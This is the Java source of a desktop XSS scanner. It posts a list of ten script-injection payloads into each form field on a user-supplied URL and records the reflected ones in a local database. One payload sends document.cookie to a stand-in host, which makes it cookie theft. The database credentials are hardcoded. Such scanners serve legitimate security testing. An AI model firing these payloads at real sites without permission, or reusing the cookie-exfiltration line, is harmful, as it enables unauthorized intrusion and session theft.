package javaapplication4;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.sql.Connection; // Import SQL Connection
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.util.HashSet;
import java.util.Set;

public class XSSScannerApp extends JFrame {
    private static final String DB_URL = "jdbc:mariadb://localhost:3306/xss_db?useSSL=false&serverTimezone=UTC&allowPublicKeyRetrieval=true"; // Change to your DB URL
    private static final String DB_USER = "root"; // Change to your DB username
    private static final String DB_PASSWORD = "admin"; // Change to your DB password

    private JTextField urlField;
    private JTextArea resultArea;
    private JTable resultTable;
    private DefaultTableModel tableModel;

    // Sample XSS payloads
    private final String[] xssPayloads = {
            "<script>alert('XSS1')</script>",
            "<img src=x onerror=alert('XSS2')>",
            "<svg/onload=alert('XSS3')>",
            "<iframe src='javascript:alert(\"XSS4\")'></iframe>",
            "<body onload=alert('XSS5')>",
            "<input type='text' value='\";alert(1);//'>",
            "<a href='javascript:alert(1)'>Click me</a>",
            "<script>document.write('<img src=x onerror=alert(6)>')</script>",
            "<script>eval('alert(7)')</script>",
            "<script>fetch('http://example.com?cookie=' + document.cookie)</script>"
    };

    public XSSScannerApp() {
        setTitle("Cross Site Scripting 'XSS' Scanner");
        setExtendedState(JFrame.MAXIMIZED_BOTH); // Full-screen mode
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLayout(new BorderLayout());

        // Center the window on the screen
        setLocationRelativeTo(null);

        // Set the application icon
        setIconImage(Toolkit.getDefaultToolkit().getImage("xss.jpg")); // Ensure xss.png is in the project directory
        
        // Header Panel
        JPanel headerPanel = new JPanel();
        headerPanel.setLayout(new FlowLayout(FlowLayout.LEFT)); // Align to the left
        headerPanel.setBackground(Color.decode("#FaFaFa"));
         
        // Add logo
        JLabel logoLabel = new JLabel();
        logoLabel.setIcon(new ImageIcon("xss.jpg")); // Load the logo image
        logoLabel.setPreferredSize(new Dimension(400, 300));
        logoLabel.setForeground(Color.WHITE); // Set text color to white
        headerPanel.add(logoLabel);
        
        
        
        // URL input panel
        JPanel inputPanel = new JPanel();
        inputPanel.setLayout(new FlowLayout(FlowLayout.LEFT)); // Align to the left
        inputPanel.setBackground(Color.decode("#FAFAFA"));
        // Create and set a larger font for the label
        JLabel urlLabel = new JLabel("Target URL:");
        urlLabel.setForeground(Color.decode("#2c3e50")); // Set the label text color
        urlLabel.setFont(new Font("Arial", Font.BOLD, 16)); // Set font size to 16
        inputPanel.add(urlLabel);

        // Create the text field and set a larger font
        urlField = new JTextField(30);
        urlField.setBackground(Color.decode("#ecf0f1")); // Set the background color
        urlField.setForeground(Color.decode("#2c3e50")); // Set the text color
        urlField.setFont(new Font("Arial", Font.PLAIN, 16)); // Set font size to 16
        urlField.setPreferredSize(new Dimension(400, 40)); // Set preferred size (width, height)
        inputPanel.add(urlField);

        // Create and set a larger font for the button
        JButton scanButton = new JButton("Scan for XSS");
        scanButton.setFont(new Font("Arial", Font.BOLD, 16)); // Set font size to 16
        scanButton.setBackground(Color.decode("#3ab4fb"));
        
        scanButton.addActionListener(new ScanAction());
        inputPanel.add(scanButton);

        // Add the input panel to the header
        headerPanel.add(inputPanel);
        add(headerPanel, BorderLayout.NORTH);

        // Result Table
        String[] columnNames = {"URL", "Payload", "Found At"};
        tableModel = new DefaultTableModel(columnNames, 0);
        resultTable = new JTable(tableModel);
         
        resultTable.getTableHeader().setBackground(Color.decode("#3ab4fb")); // Set table header background color to a specific hex code
        resultTable.getTableHeader().setForeground(Color.BLACK); // Set table header text color to white
        resultTable.setFillsViewportHeight(true);

        // Create a split pane for resizable output areas
        JSplitPane splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        splitPane.setResizeWeight(0.5); // Initial size ratio
        splitPane.setTopComponent(new JScrollPane(resultTable));
        
        // Status Area
        resultArea = new JTextArea();
        resultArea.setBackground(Color.decode("#f9f9f9")); // Set status area background color to a specific hex code
        resultArea.setForeground(Color.WHITE); // Set status area text color to black
        resultArea.setEditable(false);
        resultArea.setLineWrap(true);
        resultArea.setWrapStyleWord(true);
        splitPane.setBottomComponent(new JScrollPane(resultArea));

        add(splitPane, BorderLayout.CENTER);
    }

    private class ScanAction implements ActionListener {
        @Override
        public void actionPerformed(ActionEvent e) {
            String targetUrl = urlField.getText().trim();
            if (isValidURL(targetUrl)) {
                resultArea.setText("Scanning...\n");
                scanForXSS(targetUrl);
            } else {
                JOptionPane.showMessageDialog(null, "Please enter a valid URL.");
            }
        }
    }

    private boolean isValidURL(String url) {
        // Basic URL validation
        return url.startsWith("http://") || url.startsWith("https://");
    }

    private void scanForXSS(String targetUrl) {
    try {
        // Fetch the HTML content of the target URL
        Document doc = Jsoup.connect(targetUrl).get();
        // Select all forms on the page
        Elements forms = doc.select("form");

        // Iterate through each form found
        for (Element form : forms) {
            // Get the action URL of the form
            String actionUrl = form.attr("action");
            if (actionUrl.isEmpty()) {
                actionUrl = targetUrl; // Use the target URL if action is empty
            } else if (!actionUrl.startsWith("http")) {
                // Handle relative URLs
                String baseUrl = targetUrl.substring(0, targetUrl.lastIndexOf('/') + 1); // Get the base URL
                actionUrl = baseUrl + actionUrl; // Construct the full action URL
            }

            // Select all input fields and textareas within the form
            Elements inputs = form.select("input, textarea");
            for (Element input : inputs) {
                String inputName = input.attr("name");
                if (inputName.isEmpty()) {
                    continue; // Skip inputs without a name attribute
                }

                // Test each payload
                for (String payload : xssPayloads) {
                    // Prepare the request with the payload
                    org.jsoup.Connection.Response response = Jsoup.connect(actionUrl)
                            .data(inputName, payload) // Send the payload
                            .method(org.jsoup.Connection.Method.POST) // Assuming forms are POST
                            .execute();

                    // Check if the payload is reflected in the response body
                    String responseBody = response.body();
                    if (responseBody.contains(payload)) {
                        // Log the vulnerability found
                        resultArea.append("Vulnerability found at " + actionUrl + " with payload: " + payload + "\n");
                        storeVulnerability(actionUrl, payload);
                        // Add to the result table
                        tableModel.addRow(new Object[]{actionUrl, payload, "Found"});
                    }
                }
            }
        }
    } catch (IOException e) {
        e.printStackTrace();
        JOptionPane.showMessageDialog(null, "Error connecting to the target URL: " + e.getMessage());
    }
}

    private void storeVulnerability(String url, String payload) {
        String sql = "INSERT INTO vulnerabilities (url, payload) VALUES (?, ?)";
        try {
            // Load the MySQL JDBC driver
                        Class.forName("org.mariadb.jdbc.Driver"); // Use "com.mysql.jdbc.Driver" for older versions

            // Establish the connection
            try (Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD);
                 PreparedStatement pstmt = conn.prepareStatement(sql)) {
                pstmt.setString(1, url);
                pstmt.setString(2, payload);
                pstmt.executeUpdate();
            }
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
            JOptionPane.showMessageDialog(null, "MySQL JDBC Driver not found.");
        } catch (SQLException e) {
            e.printStackTrace();
            JOptionPane.showMessageDialog(null, "Error storing vulnerability in the database.");
        }
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> {
            XSSScannerApp app = new XSSScannerApp();
            app.setVisible(true);
        });
    }
}
